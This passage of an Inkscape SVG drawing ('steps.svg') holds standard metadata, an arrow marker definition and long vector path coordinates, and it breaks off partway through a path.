<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->

<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   version="1.1"
   width="875"
   height="392"
   id="svg2"
   inkscape:version="0.47 r22583"
   sodipodi:docname="steps.svg">
  <metadata
     id="metadata68">
    <rdf:RDF>
      <cc:Work
         rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type
           rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
        <dc:title></dc:title>
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <sodipodi:namedview
     pagecolor="#ffffff"
     bordercolor="#666666"
     borderopacity="1"
     objecttolerance="10"
     gridtolerance="10"
     guidetolerance="10"
     inkscape:pageopacity="0"
     inkscape:pageshadow="2"
     inkscape:window-width="1153"
     inkscape:window-height="1000"
     id="namedview66"
     showgrid="false"
     inkscape:zoom="1.0178977"
     inkscape:cx="491.88757"
     inkscape:cy="164.76234"
     inkscape:window-x="0"
     inkscape:window-y="0"
     inkscape:window-maximized="0"
     inkscape:current-layer="svg2" />
  <defs
     id="defs4">
    <inkscape:perspective
       sodipodi:type="inkscape:persp3d"
       inkscape:vp_x="0 : 196 : 1"
       inkscape:vp_y="0 : 1000 : 0"
       inkscape:vp_z="875 : 196 : 1"
       inkscape:persp3d-origin="437.5 : 130.66667 : 1"
       id="perspective70" />
    <marker
       orient="auto"
       id="Arrow2Lend"
       style="overflow:visible">
      <path
         d="M 8.7185878,4.0337352 -2.2072895,0.01601326 8.7185884,-4.0017078 c -1.7454984,2.3720609 -1.7354408,5.6174519 0,8.035443 z"
         transform="matrix(-1.1,0,0,-1.1,-1.1,0)"
         id="path7" />
    </marker>
  </defs>
  <g
     transform="translate(-76.600616,-661.36218)"
     id="g9">
    <path
       d="m 77.634976,736.27595 c 0.48744,-3.38307 1.14454,-4.77347 4.91681,-10.40379 l 3.32125,-4.95712 -4.00803,-2.0152 c -2.20441,-1.10836 -4.00803,-2.11242 -4.00803,-2.23125 0,-0.11883 1.14,-0.83652 2.53334,-1.59487 1.39333,-0.75835 2.53333,-1.53463 2.53333,-1.72507 0,-0.19044 -1.39172,-0.8952 -3.09272,-1.56614 -1.701,-0.67094 -3.10135,-1.44789 -3.11189,-1.72655 -0.0154,-0.40796 7.51944,-4.75741 9.49794,-5.48262 0.28283,-0.10367 0.003,-1.09057 -0.63333,-2.23387 -1.32922,-2.38811 -1.44172,-4.04061 -0.37843,-5.55867 0.79324,-1.1325 3.95674,-2.45328 4.73056,-1.97503 0.45476,0.28106 2.18167,-3.50712 1.78131,-3.90749 -0.12122,-0.12122 -2.37283,0.28717 -5.00357,0.90754 -6.39186,1.5073 -6.67982,1.2163 -2.66579,-2.69389 1.45424,-1.41663 3.33524,-2.94992 4.18,-3.40732 1.01754,-0.55096 3.33145,-3.54341 6.85592,-8.86637 3.251659,-4.91094 5.647024,-8.04268 6.161164,-8.05518 0.46264,-0.0112 1.99493,0.89156 3.40509,2.00623 2.86298,2.26305 3.40132,2.42259 3.84664,1.14 0.16932,-0.48767 1.29417,-1.98575 2.49967,-3.32907 l 2.19182,-2.4424 3.4878,3.91018 c 1.9183,2.1506 3.71581,4.10761 3.99448,4.34892 0.27866,0.24131 3.69866,2.00227 7.6,3.91324 l 7.09333,3.4745 -3.94117,0.64417 c -2.16765,0.35429 -4.0543,0.82721 -4.19257,1.05094 -0.13827,0.22372 0.44655,1.54109 1.29961,2.92749 1.49706,2.43304 1.60724,2.50459 3.16762,2.05708 2.04136,-0.58546 3.11836,-0.24302 4.41329,1.40323 1.29689,1.64872 1.30143,3.52992 0.0132,5.47505 -0.55366,0.836 -1.00816,1.67254 -1.00999,1.85897 -0.005,0.45031 3.96408,1.39448 8.35666,1.98817 4.60739,0.62273 4.81333,0.71433 4.81333,2.14098 0,0.84314 -0.91568,2.00302 -3.04,3.85069 -1.672,1.45426 -3.04,2.81748 -3.04,3.02938 0,0.21189 1.14,0.91921 2.53334,1.57181 1.39333,0.6526 2.53333,1.32637 2.53333,1.49725 0,0.17089 -1.25565,1.55075 -2.79032,3.06636 l -2.79032,2.75566 4.29878,4.32037 c 3.21056,3.22667 4.5068,4.93149 5.12049,6.73448 0.79873,2.34663 0.78843,2.48117 -0.36846,4.81333 -0.81871,1.6504 -1.74364,2.66299 -2.9635,3.24436 -2.70921,1.29117 -10.69173,2.06805 -23.74444,2.31088 l -11.83776,0.22022 0.81776,-1.16753 c 1.02632,-1.46528 1.05459,-3.66143 0.0578,-4.48871 -0.418,-0.34691 -0.76,-1.13749 -0.76,-1.75685 0,-1.93235 1.4789,-2.73792 5.33141,-2.90404 3.34768,-0.14436 3.53525,-0.21672 3.53525,-1.36389 0,-1.86262 -1.33226,-2.42335 -3.90505,-1.64358 -3.7563,1.13848 -5.21718,1.23475 -5.91829,0.38996 -1.49363,-1.79972 0.91343,-4.34752 4.57847,-4.84617 2.50702,-0.34109 3.1204,-1.36993 1.11658,-1.87285 -0.91157,-0.22879 -2.22894,-0.035 -3.70933,0.54581 -1.26264,0.49534 -2.77504,0.9008 -3.36088,0.90103 -2.40762,10e-4 -3.47286,5.11756 -2.15503,10.35111 0.65339,2.59487 0.24544,3.19113 -2.19281,3.20504 -1.09449,0.006 -1.40276,-0.26399 -1.58057,-1.38557 -0.12149,-0.76634 -0.13917,0.25966 -0.0393,2.28 l 0.18159,3.67333 -13.452064,0 -13.45206,0 0.34675,-2.40667 z m 47.701204,1.12842 c 1.19483,-0.49923 1.9586,-0.59048 2.16377,-0.25851 0.1744,0.28219 0.30508,-0.73637 0.29039,-2.26348 -0.0147,-1.5271 -0.1027,-2.55077 -0.19559,-2.27482 -0.0929,0.27595 -1.07222,0.50173 -2.17629,0.50173 -1.98997,0 -2.00474,-0.0143 -1.70037,-1.64667 0.16886,-0.90567 0.3502,-3.47067 0.40296,-5.7 0.16425,-6.94027 -2.32538,-9.87757 -8.37355,-9.87921 -3.68266,-10e-4 -6.47719,1.24143 -6.47719,2.87972 0,1.44279 0.3971,1.45195 4.11855,0.095 2.80493,-1.02273 3.02269,-1.03403 4.26301,-0.22134 1.94124,1.27195 1.41454,2.46557 -1.29185,2.92759 -2.4863,0.42444 -4.71819,1.81377 -4.97005,3.09379 -0.23967,1.21812 2.03605,1.59283 3.8806,0.63898 3.19417,-1.65177 6.6664,-0.75588 6.6664,1.72002 0,1.93171 -0.51191,2.18024 -4.32063,2.09765 -2.31076,-0.0501 -3.41866,0.15277 -3.99797,0.73208 -1.86098,1.86098 -0.44774,3.32312 3.034,3.13897 l 2.45698,-0.12996 0.33458,1.98528 c 0.54108,3.21057 2.40363,4.02078 5.89225,2.56314 z m -36.329194,-3.79949 c 0.9735,-0.28476 2.56799,-0.62634 3.54333,-0.75907 3.61953,-0.49257 11.357394,-2.18593 10.177034,-2.22715 -0.67263,-0.0235 -3.252135,0.34628 -5.732234,0.82171 -3.92879,0.75314 -4.56934,0.76945 -4.97594,0.12667 -0.3953,-0.62491 -0.46787,-0.61117 -0.47444,0.0898 -0.008,0.84695 -1.39811,1.43319 -3.42776,1.44551 -0.627,0.004 -1.14,0.23492 -1.14,0.51358 0,0.61756 -0.12131,0.61821 2.03001,-0.0111 z m 3.72655,-3.78893 c 0.1604,-0.418 0.0708,-0.76 -0.19913,-0.76 -0.26992,0 -0.49076,0.342 -0.49076,0.76 0,0.418 0.0896,0.76 0.19913,0.76 0.10951,0 0.33036,-0.342 0.49076,-0.76 z m 41.490104,-0.66037 c 2.99567,-0.46532 5.44667,-1.01294 5.44667,-1.21693 0,-0.20399 -0.285,-0.28394 -0.63334,-0.17765 -0.34833,0.10627 -3.19833,0.58587 -6.33333,1.06577 -3.135,0.47989 -5.7,1.09418 -5.7,1.36507 0,0.27089 0.399,0.33891 0.88667,0.15115 0.48766,-0.18775 3.33766,-0.72209 6.33333,-1.18741 z m -27.44774,-5.29675 c 0.16923,-1.04109 0.6666,-2.29264 1.10527,-2.78122 1.17681,-1.31068 0.57668,-3.33996 -1.31391,-4.44282 -2.62596,-1.53183 -6.37633,-4.8735 -7.487675,-6.67169 -1.409639,-2.28086 -2.341649,-2.11288 -3.560099,0.64163 -1.15594,2.61319 -1.85507,2.69774 -0.97993,0.11851 0.60428,-1.78096 3.887509,-5.65749 4.492599,-5.30446 0.74589,0.43516 7.958935,-3.47372 8.131705,-4.40671 0.14953,-0.80749 -0.0488,-0.88838 -1.43294,-0.58438 -5.820455,1.27839 -9.617514,-3.73473 -6.409425,-8.46213 1.069345,-1.57576 1.110105,-1.8151 0.38,-2.23086 -0.44982,-0.25615 -1.45669,-0.38937 -2.237479,-0.29605 -1.73214,0.20704 -2.18217,1.24188 -2.66325,6.12415 -0.19632,1.99227 -0.565,3.7509 -0.81931,3.90807 -0.2543,0.15717 -1.05103,-0.0999 -1.7705,-0.57135 -1.68994,-1.1073 -1.90081,-0.76093 -2.92104,4.79805 -1.00901,5.49781 -1.01171,10.17308 -0.007,12.58133 1.50243,3.6022 5.49881,6.75488 10.614309,8.37343 5.504255,1.74156 6.485265,1.6284 6.878935,-0.7935 z m 22.60794,-2.22023 c 1.71443,-1.01422 4.21725,-2.96147 5.56181,-4.32724 l 2.44466,-2.48321 0,-4.6661 0,-4.66609 -3.41045,-7.00385 c -2.9702,-6.09973 -3.53986,-6.96276 -4.41301,-6.68563 -0.84155,0.26709 -1.28379,-0.24022 -2.75349,-3.15866 -0.96301,-1.91227 -2.13682,-3.79713 -2.60848,-4.18857 -0.74771,-0.62054 -0.9479,-0.58817 -1.56274,0.25267 -0.9423,1.28868 -0.89044,1.65695 0.28591,2.03031 0.5451,0.173 1.59551,1.03287 2.33425,1.91081 1.13132,1.3445 1.30378,1.94565 1.09348,3.81143 -0.16709,1.48242 -0.70286,2.68819 -1.61966,3.64512 -1.09083,1.13859 -1.26578,1.62463 -0.85861,2.38543 0.40437,0.75558 0.94456,0.91417 2.58192,0.75802 1.13881,-0.1086 2.1837,-0.38052 2.32198,-0.60425 0.38186,-0.61788 5.19509,1.87535 5.79906,3.00388 0.91264,1.70528 0.58494,1.80566 -0.98488,0.30168 -0.83309,-0.79815 -1.59064,-1.35381 -1.68343,-1.23479 -0.0928,0.11902 -0.59128,1.35502 -1.10774,2.74667 -0.51645,1.39165 -2.62337,5.02265 -4.68204,8.06888 l -3.74304,5.53861 1.29882,2.38635 c 0.71435,1.31249 1.29881,2.7545 1.29881,3.20445 0,1.23142 0.97456,1.00454 4.40687,-1.02592 z m -18.08687,-5.77477 1.77334,-0.98965 -2.78667,0.31952 c -3.1459,0.36072 -3.27072,0.41238 -2.8075,1.16188 0.49208,0.79621 1.81898,0.62543 3.82083,-0.49175 z m 10.63224,-0.61454 c -0.0149,-2.19226 -0.49813,-2.37157 -4.17086,-1.54768 -1.87885,0.42148 -3.30306,0.94922 -3.1649,1.17277 0.13816,0.22354 0.64997,0.30696 1.13736,0.18536 0.48739,-0.1216 1.91216,0.10527 3.16616,0.50414 3.07412,0.97781 3.04106,0.98124 3.03224,-0.31459 z m -15.28934,-2.52047 c 0.14157,-1.70234 0.0226,-1.90629 -1.26666,-2.17241 -0.7826,-0.16153 -2.5059,-0.7196 -3.82957,-1.24015 -1.44994,-0.57021 -2.406665,-0.73172 -2.406665,-0.40628 0,0.2971 1.238925,1.7791 2.753165,3.29335 3.24656,3.24656 4.51181,3.38654 4.74973,0.52549 z m 6.30377,1.29264 c 0.57441,-0.34058 0.45526,-3.09918 -0.15002,-3.47327 -0.29151,-0.18016 -1.65951,-0.17222 -3.04,0.0176 l -2.50998,0.34521 0,2.02667 0,2.02667 2.66,-0.35881 c 1.463,-0.19734 2.831,-0.46019 3.04,-0.58411 z m 10.84603,-0.0388 c 0.38376,-0.48766 0.92396,-1.27452 1.20043,-1.74857 0.45095,-0.77319 0.34567,-0.80717 -1.02282,-0.33011 -1.7934,0.62518 -2.1445,1.06489 -1.72441,2.15963 0.39504,1.02944 0.68494,1.01427 1.5468,-0.081 z m -6.13683,-0.94826 c 3.45209,-0.86714 3.61212,-1.08808 2.69456,-3.72018 -0.54403,-1.56061 -0.68668,-1.63817 -2.55263,-1.3879 -3.27302,0.43901 -4.28977,1.40243 -4.05692,3.84414 0.10939,1.14705 0.29909,2.08554 0.42155,2.08554 0.12246,0 1.69451,-0.36972 3.49344,-0.8216 z m 7.48987,-2.33341 c 1.22158,-0.44179 1.38409,-0.7138 1.10414,-1.84818 -0.47881,-1.94023 -0.87152,-2.15708 -3.07674,-1.6989 -2.1847,0.45391 -2.57656,1.20793 -1.75321,3.3735 0.40077,1.05409 0.75382,1.31586 1.41378,1.04827 0.48379,-0.19617 1.52421,-0.58978 2.31203,-0.87469 z m -11.81907,-1.96794 c 1.254,-0.57605 3.534,-1.23028 5.06667,-1.45383 4.70499,-0.68627 6.84565,-1.4538 9.42695,-3.38002 l 2.47971,-1.8504 -2.13807,2.23389 c -1.63419,1.70743 -2.06804,2.50171 -1.84091,3.37027 0.16344,0.625 0.47691,1.13637 0.6966,1.13637 0.67437,0 3.15027,-4.62071 3.2279,-6.02413 0.0402,-0.7274 0.2544,-1.60915 0.47593,-1.95945 0.25268,-0.39955 0.0803,-0.76067 -0.4626,-0.96899 -0.90459,-0.34712 -2.23885,0.9696 -2.23885,2.20941 0,0.36474 -0.36822,0.66316 -0.81827,0.66316 -0.75325,0 -0.75325,-0.0992 0,-1.24884 1.14895,-1.75352 1.05813,-1.88208 -1.05024,-1.48654 -1.13455,0.21284 -2.34438,0.91606 -3.07994,1.79023 -1.95534,2.32378 -3.92023,3.46643 -6.91186,4.01946 -3.23335,0.59772 -6.50027,-0.0399 -8.18283,-1.59695 -1.02699,-0.9504 -1.0839,-0.94814 -3.67334,0.14587 -1.4466,0.61117 -2.63018,1.27585 -2.63018,1.47707 0,0.20122 0.684,0.51608 1.52,0.6997 1.46067,0.32082 1.85212,0.76565 1.22534,1.39243 -0.16206,0.16207 -1.06674,-0.0279 -2.0104,-0.42222 -1.97778,-0.82637 -3.268275,-0.92335 -3.268275,-0.24562 0,0.25919 1.196995,0.93131 2.659995,1.4936 3.61245,1.3884 8.51117,1.39075 11.52667,0.006 z m 4.64639,-4.0828 c 2.22027,-0.66521 5.48694,-3.92264 5.48694,-5.47142 0,-1.62491 -2.72257,-4.23813 -6.09459,-5.84981 l -3.1556,-1.50824 -2.25174,2.53094 c -2.6514,2.98017 -4.20473,5.7822 -4.20473,7.58487 0,2.76488 5.32733,4.17946 10.21972,2.71366 z m -28.796844,-4.56142 c 0.95616,-3.98401 0.71345,-4.71376 -1.39201,-4.18532 -1.85681,0.46603 -2.96822,2.26074 -2.53415,4.09217 0.32618,1.37627 2.05037,3.72698 2.73365,3.72698 0.17621,0 0.71285,-1.63522 1.19251,-3.63383 z m 18.507304,-1.03172 c 0.10094,-0.26892 1.30707,-1.95484 2.6803,-3.74649 1.61645,-2.10899 2.26632,-3.32486 1.84315,-3.44843 -0.3595,-0.10499 -2.87572,-0.47201 -5.59161,-0.81561 -5.43876,-0.68808 -5.87928,-0.56054 -7.255425,2.10065 -1.607389,3.10834 -0.29477,5.87023 3.104775,6.53282 2.24468,0.4375 4.94161,0.11558 5.21881,-0.62294 z m -0.27325,-5.26562 c -0.38857,-1.01261 0.84381,-1.8512 1.68929,-1.14951 0.76668,0.63629 0.32335,1.96064 -0.65633,1.96064 -0.39693,0 -0.86176,-0.36501 -1.03296,-0.81113 z m 18.58307,-2.03358 c 0,-1.37753 -0.37954,-2.16994 -1.57359,-3.28534 -0.86547,-0.80847 -2.0634,-1.46995 -2.66207,-1.46995 -1.14536,0 -5.83256,3.43761 -5.87218,4.30667 -0.0127,0.27867 1.21128,1.15163 2.71996,1.93991 1.50868,0.78828 3.15674,1.89035 3.66234,2.44904 0.91433,1.01032 0.92686,1.00733 2.32241,-0.55457 0.9798,-1.09658 1.40313,-2.11808 1.40313,-3.38576 z m -4.4638,-0.3327 c -0.72686,-0.87582 0.0825,-2.12354 1.11933,-1.72565 0.99395,0.38141 1.03738,1.04455 0.11836,1.80727 -0.5218,0.43306 -0.82726,0.41291 -1.23769,-0.0816 z m 13.89182,4.31741 c 0.3702,-0.48766 0.68033,-1.83912 0.6892,-3.00322 0.0129,-1.69834 -0.24991,-2.32581 -1.33017,-3.17555 -1.29506,-1.01869 -2.81342,-1.02649 -3.8993,-0.02 -0.4078,0.37797 2.98754,7.08547 3.58666,7.08547 0.1543,0 0.58342,-0.399 0.95361,-0.88667 z m -22.08693,-6.08 c 0.006,-0.65371 0.11643,-0.71538 0.4214,-0.23473 0.30244,0.47667 1.05189,0.0137 2.78779,-1.72222 1.30579,-1.30579 2.28372,-2.4646 2.17319,-2.57513 -0.28198,-0.28197 -12.64316,2.44395 -13.16097,2.90229 -0.41639,0.36857 5.14434,2.35807 6.88416,2.46299 0.52443,0.0316 0.88984,-0.30877 0.89443,-0.8332 z"
       id="path119" />
    <path
       d="m 524.56334,727.25976 c 11.19672,-3.87309 20.47701,-7.16133 20.62287,-7.30719 0.14585,-0.14585 1.65926,-11.12529 3.36312,-24.39873 1.70385,-13.27345 3.25062,-25.04056 3.43725,-26.14913 0.27207,-1.61607 0.13054,-2.01559 -0.71405,-2.01559 -1.19454,0 -36.91382,11.71298 -37.56978,12.31979 -0.23421,0.21666 -1.5565,6.78619 -2.93841,14.59895 -1.38192,7.81278 -2.58571,14.26368 -2.67507,14.33537 -0.0894,0.0717 -7.06978,1.88712 -15.51198,4.0343 -9.27101,2.35797 -15.34949,4.19635 -15.34949,4.6423 0,1.03225 24.25258,17.05637 25.75286,17.01539 0.67377,-0.0185 10.38596,-3.20236 21.58268,-7.07546 z m -33.29058,-2.1323 c -9.37795,-6.25008 -10.86317,-7.44576 -9.7053,-7.81325 0.75189,-0.23864 7.23814,-1.9238 14.4139,-3.7448 7.17577,-1.82099 13.24112,-3.5375 13.47857,-3.81448 0.23744,-0.27697 1.48487,-6.64339 2.77206,-14.14757 1.2872,-7.50419 2.65913,-13.95896 3.04873,-14.34395 0.66612,-0.6582 34.56415,-12.16459 34.88674,-11.84201 0.35015,0.35015 -6.1259,48.56141 -6.58877,49.0504 -0.60197,0.63594 -38.94598,13.95943 -40.30328,14.00428 -0.51165,0.0169 -5.91285,-3.28996 -12.00265,-7.34862 z m 13.22904,1.02381 c -0.0143,-0.79301 -9.393,-7.28712 -10.52397,-7.28712 -1.84572,0 -0.0149,1.91828 4.5873,4.8064 5.58441,3.50452 5.95793,3.6606 5.93667,2.48072 z m 9.93687,-3.56037 c 0,-0.61831 -11.83415,-6.82766 -13.01254,-6.82766 -1.95014,0 0.0899,1.59101 5.5591,4.33562 6.35643,3.1898 7.45344,3.55659 7.45344,2.49204 z m 9.92289,-4.29271 c 0,-0.31128 -2.02334,-1.32646 -4.49631,-2.25595 -2.47297,-0.92949 -5.43742,-2.07021 -6.58764,-2.53494 -2.60116,-1.05094 -3.18022,-1.05895 -3.18022,-0.0439 0,0.45203 2.76958,1.80889 6.35686,3.11431 6.57887,2.39406 7.90731,2.68311 7.90731,1.72049 z m 16.94866,-22.84588 c 1.27499,-8.44222 2.30889,-15.83788 2.29757,-16.43479 -0.0286,-1.50124 -0.66049,-1.4269 -13.60917,1.60083 -9.32055,2.17939 -11.49504,2.88989 -11.83776,3.86796 -0.70012,1.99807 -3.93552,21.34744 -3.62193,21.66104 0.28061,0.28059 22.72925,4.65445 23.88881,4.65445 0.31037,0 1.60749,-6.90727 2.88248,-15.34949 z m -16.01839,11.27827 c -4.77539,-0.89293 -8.78415,-1.72293 -8.90836,-1.84447 -0.1242,-0.12153 0.5474,-4.68433 1.49245,-10.13955 l 1.71829,-9.91859 9.67081,-2.2646 c 5.31894,-1.24553 10.29873,-2.40871 11.06621,-2.58484 1.06095,-0.2435 1.39593,-0.044 1.39758,0.83229 0.002,1.42626 -3.68184,26.26768 -4.06471,27.4046 -0.18183,0.53989 -0.86676,0.70619 -1.98372,0.48163 -0.93831,-0.18863 -5.61316,-1.07354 -10.38855,-1.96647 z"
       id="path121" />
    <path
       d="m 893.99292,736.74043 c -0.10087,-0.0281 -0.15364,-0.12969 -0.15364,-0.29579 0,-0.29919 -0.13685,-0.26672 2.23887,-0.53117 1.53137,-0.17046 2.11104,-0.18481 7.06784,-0.17489 3.39343,0.007 5.66061,-0.024 6.10204,-0.0829 1.85363,-0.24732 3.08042,-0.32447 4.65335,-0.29266 0.9175,0.0186 4.0684,0.0562 7.00198,0.0836 l 5.3338,0.0499 0,0.30887 0,0.30887 -5.50939,-0.0509 c -3.03017,-0.028 -6.31935,-0.059 -7.30928,-0.069 -1.64505,-0.0166 -2.41526,0.0345 -4.17046,0.27678 -0.34399,0.0475 -3.05005,0.0835 -6.14594,0.0818 -5.7188,-0.003 -5.8135,10e-4 -8.69212,0.39436 -0.14487,0.0198 -0.33254,0.0167 -0.41705,-0.007 z m 28.38108,-3.46664 c -0.26559,-0.0415 -1.27309,-0.11147 -2.23888,-0.15542 -0.96579,-0.0439 -1.97328,-0.1275 -2.23888,-0.18565 -0.36023,-0.0789 -3.46034,-0.11127 -12.20408,-0.12749 -6.44665,-0.012 -11.75082,-0.0271 -11.78703,-0.0337 -0.0362,-0.007 -0.0658,-0.12784 -0.0658,-0.26946 0,-0.17171 0.0512,-0.27057 0.15364,-0.29678 0.0845,-0.0216 5.36892,-0.0299 11.74314,-0.0185 10.25241,0.0184 11.69078,0.0374 12.46748,0.16457 0.49392,0.0809 1.38165,0.14398 2.02935,0.14427 0.63324,0 1.36417,0.045 1.62428,0.0993 0.26011,0.0543 1.34214,0.10371 2.40451,0.10975 l 1.93158,0.011 0,0.30549 0,0.30548 -1.66818,0.0113 c -0.9175,0.006 -1.88549,-0.0226 -2.15108,-0.0642 z m -28.53472,-3.84859 0,-0.32484 0.89994,-0.11961 c 0.59435,-0.079 1.60868,-0.11253 2.98717,-0.0987 1.44857,0.0145 2.46945,-0.0217 3.33637,-0.11819 1.77645,-0.19774 21.71046,-0.19831 22.56645,-8.8e-4 0.29957,0.0692 0.70271,0.13022 0.89587,0.13564 0.19316,0.005 0.6574,0.0309 1.03164,0.0567 l 0.68044,0.0469 0,0.29819 0,0.2982 -1.07554,-0.0461 c -0.59154,-0.0254 -1.30413,-0.10394 -1.58351,-0.17462 -0.7637,-0.19318 -20.68695,-0.19316 -22.49041,4e-5 -0.77236,0.0827 -2.06857,0.13012 -3.51196,0.1284 -1.57146,-0.002 -2.51458,0.0358 -3.01212,0.12039 l -0.72434,0.12311 0,-0.32483 z m 40.2217,-2.58043 c -0.18389,-0.22157 0.0115,-0.37803 0.5409,-0.43306 0.2525,-0.0263 0.73522,-0.11001 1.0727,-0.18612 0.33747,-0.0761 0.71281,-0.13989 0.83409,-0.14173 0.12127,-0.002 0.59793,-0.0252 1.05923,-0.052 0.71587,-0.0415 0.85663,-0.0271 0.9607,0.0983 0.089,0.10726 0.0971,0.18646 0.03,0.29324 -0.074,0.11778 -0.31252,0.1595 -1.22409,0.21408 -0.62268,0.0373 -1.25067,0.10878 -1.39554,0.15887 -0.14487,0.0501 -0.59991,0.11372 -1.0112,0.14142 -0.62597,0.0421 -0.76719,0.027 -0.86679,-0.093 z m -9.4042,-0.11549 c -0.16902,-0.0175 -0.58387,-0.0731 -0.92189,-0.12359 -0.33803,-0.0505 -1.08871,-0.11873 -1.66819,-0.15168 -1.26996,-0.0722 -23.08613,-0.0734 -26.09829,-0.001 l -2.12913,0.0509 0,-0.32342 0,-0.32344 1.51453,-0.0234 c 0.833,-0.0129 6.76932,-0.0427 13.19182,-0.0663 11.348,-0.0417 14.07705,0 15.23316,0.2318 0.2173,0.0436 0.85933,0.10695 1.42673,0.14079 l 1.03164,0.0615 0,0.29412 0,0.29413 -0.63654,-0.014 c -0.3501,-0.008 -0.77483,-0.0284 -0.94384,-0.0459 z m 17.87712,-0.77672 c -0.16769,-0.16769 -0.094,-0.37933 0.15334,-0.44059 0.10333,-0.0256 0.69726,-0.0351 1.31985,-0.0212 0.94289,0.0211 1.14738,0.0498 1.2241,0.17162 0.0668,0.10605 0.0604,0.18456 -0.0233,0.28535 -0.16708,0.20132 -2.47333,0.20548 -2.67399,0.005 z m -8.83991,-1.5852 c -0.0836,-0.10077 -0.0901,-0.17934 -0.0234,-0.28535 0.0781,-0.12406 0.33075,-0.15456 1.66309,-0.20072 0.86407,-0.0299 1.69181,-0.0827 1.83943,-0.11723 0.18946,-0.0443 0.29965,-0.0251 0.37467,0.0653 0.16433,0.19802 0.0394,0.38068 -0.36629,0.53562 -0.53815,0.20552 -3.31739,0.20745 -3.48754,0.002 z m 6.46934,-0.25858 c -0.16779,-0.16778 -0.0939,-0.3796 0.15333,-0.43984 0.10333,-0.0252 1.38862,-0.0347 2.85621,-0.0212 2.37802,0.0219 2.67838,0.0405 2.76058,0.17086 0.0669,0.10613 0.0606,0.18447 -0.0232,0.28535 -0.1008,0.12146 -0.46327,0.13906 -2.86406,0.13906 -2.3493,0 -2.76816,-0.0195 -2.88289,-0.13424 z m -15.02366,-1.23841 c -1.25961,-0.14246 -5.39584,-0.30491 -7.41903,-0.29139 -0.79677,0.005 -5.28111,0.0224 -9.9652,0.038 -6.16382,0.0205 -8.71055,0.0581 -9.21891,0.13613 -0.38632,0.0593 -1.60124,0.1257 -2.69982,0.14755 l -1.99743,0.0397 0,-0.30729 0,-0.3073 1.99743,-0.0397 c 1.09858,-0.0219 2.3135,-0.0879 2.69982,-0.14685 0.50485,-0.077 3.09764,-0.11556 9.21891,-0.13716 4.68409,-0.0165 9.24745,-0.0328 10.1408,-0.0361 2.15023,-0.008 5.63171,0.11965 7.13368,0.26158 l 1.20724,0.11407 0,0.33611 c 0,0.18487 -0.01,0.33065 -0.022,0.32397 -0.0121,-0.007 -0.49606,-0.0658 -1.07554,-0.13131 z m 7.52878,-0.70488 c -0.15511,-0.0626 -0.13638,-0.42504 0.0291,-0.56235 0.24104,-0.20004 0.98756,-0.27809 3.02944,-0.31674 1.75747,-0.0333 1.9965,-0.0212 2.10209,0.10602 0.0868,0.10454 0.0941,0.1833 0.027,0.28983 -0.0797,0.1265 -0.35812,0.15394 -2.05818,0.20284 -2.00704,0.0577 -2.67589,0.12069 -2.76201,0.26002 -0.052,0.0842 -0.19029,0.0918 -0.36741,0.0204 z m 9.16521,-0.0735 c -0.0278,-0.0724 -0.0278,-0.19096 0,-0.2634 0.0425,-0.11077 0.31968,-0.1317 1.74383,-0.1317 1.42417,0 1.70133,0.0209 1.74384,0.1317 0.0278,0.0724 0.0278,0.19096 0,0.2634 -0.0425,0.11077 -0.31967,0.1317 -1.74384,0.1317 -1.42415,0 -1.70132,-0.0209 -1.74383,-0.1317 z m -9.27496,-2.41273 c -0.0724,-0.0478 -0.38851,-0.0881 -0.70239,-0.0896 -0.31389,-10e-4 -0.62254,-0.0356 -0.68591,-0.0757 -0.11063,-0.0702 -0.17979,-2.18391 -0.17645,-5.39268 8.8e-4,-0.64882 -0.0349,-0.99004 -0.11309,-1.08424 -0.15787,-0.19023 -0.17709,-0.7917 -0.0292,-0.91442 0.0858,-0.0712 0.6363,-0.0824 1.94502,-0.0396 3.41398,0.11174 9.64258,0.0875 10.73693,-0.0418 1.34216,-0.15857 2.28955,-0.13399 2.43798,0.0632 0.14151,0.18804 0.0677,1.74384 -0.12212,2.57405 -0.13888,0.60739 -0.19985,2.67091 -0.0971,3.28689 0.25649,1.53803 0.28808,1.49243 -1.09585,1.58168 -2.61624,0.16874 -11.88872,0.27002 -12.09777,0.13215 z m 9.74571,-0.62329 c 0.84506,-0.0451 1.86112,-0.10556 2.25789,-0.13445 l 0.72141,-0.0525 -0.0461,-0.40788 c -0.0254,-0.22433 -0.0888,-0.57716 -0.14103,-0.78406 -0.13018,-0.51589 -0.0167,-2.34562 0.19818,-3.19432 0.0954,-0.37674 0.17041,-0.96971 0.17041,-1.34673 l 0,-0.67361 -0.50485,0.0428 c -0.27766,0.0235 -0.95567,0.0839 -1.50667,0.13426 -1.06499,0.0973 -7.65261,0.12523 -10.36817,0.044 l -1.62428,-0.0486 0.0704,1.17271 c 0.0387,0.64499 0.0895,2.09036 0.11283,3.21194 l 0.0425,2.03922 0.38115,-0.0522 c 0.21632,-0.0297 0.45228,-0.0109 0.54565,0.0433 0.20664,0.12005 7.4682,0.12467 9.69073,0.006 z m -30.24681,0.0453 c -0.8849,-0.0805 -3.54082,-0.1135 -9.48231,-0.11771 -4.53921,-0.003 -8.36177,-0.006 -8.49457,-0.007 -0.21716,-10e-4 -0.24144,-0.0322 -0.24144,-0.3086 l 0,-0.30729 8.45066,10e-4 c 6.6804,9.2e-4 8.76334,0.0281 9.94326,0.1299 1.13255,0.0977 3.00153,0.12918 7.74827,0.13054 l 6.25569,0.002 0,0.30836 0,0.30837 -6.47518,-0.0137 c -4.43865,-0.009 -6.86179,-0.0489 -7.70438,-0.12561 z m -18.21832,-3.84274 c 0,-0.25473 0.0386,-0.31465 0.24144,-0.37513 0.1328,-0.0396 7.42232,-0.0737 16.19895,-0.0759 l 15.95749,-0.004 0,0.3139 0,0.3139 -15.78189,-0.004 c -8.68005,-0.002 -15.96957,0.0269 -16.19895,0.0651 l -0.41704,0.0696 0,-0.30316 z m 1.07554,-3.28812 -1.07554,-0.0246 0,-0.28895 0,-0.28894 16.19894,0.006 16.19894,0.006 0,0.31027 0,0.31028 -15.1234,-0.002 c 